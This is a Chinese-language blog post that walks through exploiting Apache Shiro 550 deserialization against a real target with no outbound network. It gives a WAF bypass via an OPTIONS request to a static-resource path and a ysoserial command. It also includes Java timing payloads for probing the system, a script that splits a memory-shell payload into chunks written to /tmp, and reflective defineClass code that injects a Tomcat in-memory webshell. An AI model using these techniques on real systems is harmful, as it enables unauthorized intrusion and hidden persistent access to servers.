#  记一次 Shiro 的实战利用

原创 pen4uin [ pen4uin ](javascript:void\(0\);)

**pen4uin** ![]()

微信号 gh_ffc9f5385230

功能介绍 仅供参考。

____

___发表于_

收录于合集 #漏洞利用 3个

### 0x01 前言

本文记录一次攻防中比较苛刻场景下的 shiro 550 漏洞的不出网利用。

### 0x02 简介

主要内容：

  * 绕过 WAF  对 rememberMe 长度的限制
  * 加载本地字节码 defineClass 注入内存马

### 0x03 漏洞验证

1、验证后端反序列化功能是否正常

![](https://gitee.com/fuli009/images/raw/master/public/20230714175128.png)

  

（被拦截）

根据经验猜测大概率是限制了 rememberMe 的长度

2、删减到 300 左右，正常放行

![](https://gitee.com/fuli009/images/raw/master/public/20230714175129.png)

  

3、绕过 waf  对 rememberMe 长度的限制

OPTIONS 请求方式 + 静态资源 uri 路径

  * 

    
    
    OPTIONS /app/login;index.css

成功将 rememberMe 的长度提升到 7000 左右

但超过 7000 依然会被拦截，没法再绕

![](https://gitee.com/fuli009/images/raw/master/public/20230714175130.png)

  

4、验证后端反序列化功能是否正常

反序列化炸弹

  * 

    
    
    java -jar ysoserial-for-woodpecker-<version>.jar -g FindClassByBomb -a "java.lang.String|25"

延时成功，说明后端功能正常

![](https://gitee.com/fuli009/images/raw/master/public/20230714175131.png)

  

5、探测目标是否出网

通过 urldns/httplog/jrmp 的方式探测，发现目标不出网

6、探测反序列化链

通过延时探测反序列化链

![](https://gitee.com/fuli009/images/raw/master/public/20230714175132.png)

  

说明目标存在 gadget: CommonsCollections10

### 0x04 漏洞利用

7、梳理信息与思路

请求方式：OPTIONS

  * 分离payload+动态类加载的姿势失效（OPTIONS 无法传递参数）
  * 修改 maxHeaderSize 没用（nignx 反代）

目标不出网

  * 远程加载字节码的姿势失效

利用思路

  * 命令执行/代码执行 写文件马
  * 代码执行 注内存马

8、判断目标操作系统

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public class Payload extends AbstractTranslet {    public void transform(DOM var1, SerializationHandler[] var2) {}    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) {}    static {        try {            String osType = System.getProperty("os.name");            if (osType != null && osType.toLowerCase().contains("win")) {                Thread.sleep(3000);            }else {                Thread.sleep(5000);            }        } catch (Throwable var16) {        }    }}

延时6s，说明目标操作系统极大概率为 *nix

![](https://gitee.com/fuli009/images/raw/master/public/20230714175133.png)

9、尝试写文件马

通过 find 静态资源文件获取web路径并写入文件马，失败

猜测原因

  * 当前用户权限问题（不是root）
  * 当前应用部署问题（以springboot fatjar的方式部署）

10、排查写入失败原因

在 home 目录写文件

  * 

    
    
    echo 123321 > /home/tmp.txt

判断文件是否写入成功

  *   *   *   *   *   * 

    
    
    File file = new File("/home/tmp.txt");if (file.exists()) {    Thread.sleep(2000);} else {    Thread.sleep(5000);}

延时6s，说明当前权限足够，则很有可能是应用部署层面导致的，文件马的路到此为止，尝试内存马

11、尝试注入内存马

将字节码写到临时目录，然后从目标本地读取文件加载字节码

由于 paylaod 长度限制，内存马需要分散写入，经过测试发现每次最多能写长度为 1600 左右

1）使用 java-memshell-generator 辅助模块延时确认目标中间件为 tomcat

  *   *   *   *   *   *   * 

    
    
    detect_way=Sleepserver_type=Tomcatdnslog_domain=xxx.dnslog.cnhttplog_url=http://xxx.httplog.cnsleep_seconds=5gadget_type=JDK_AbstractTransletformat_type=CLASS

2）拆分内存马，限制每组长度为 1600

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    public static void main(String[] args) {    String input = "[payload]";int groupSize = 1600;int length = input.length();int startIndex = 0;int endIndex = Math.min(length, groupSize);int a = 1;while (startIndex < length) {        String group = input.substring(startIndex, endIndex);        System.out.println(a + ":" + group);        startIndex = endIndex;        endIndex = Math.min(startIndex + groupSize, length);        a++;    }}  
    

拆分成了 14 组

![](https://gitee.com/fuli009/images/raw/master/public/20230714175134.png)

3）写入内存马的字节码

  *   *   *   * 

    
    
    // 第1次echo [payload01] > /tmp/log.txt// 第2 - 14次 使用 '>>' 追加文件内容echo [payload14] >> /tmp/log.txt

4）读取字节码进行 defineClass

  * 注意换行符问题

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();// 读取文件byte[] fileBytes = Files.readAllBytes(Paths.get("/tmp/log.txt"));String fileContent = new String(fileBytes, StandardCharsets.UTF_8);// 删除多余的换行符String base64Str = fileContent.replace("\r","").replace("\n","");byte[] clazzByte = (new BASE64Decoder()).decodeBuffer(base64Str);Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);defineClass.setAccessible(true);Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);clazz.newInstance();  
    

5）成功注入内存马

![](https://gitee.com/fuli009/images/raw/master/public/20230714175135.png)

### 0x05  总结

目标虽然成功拿下了，但这是一种不太优雅的利用方式，不管是落地文件还是追加文件内容的选择都有可能会遇到更苛刻的挑战，比如文件无法落地、有负载均衡等。

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

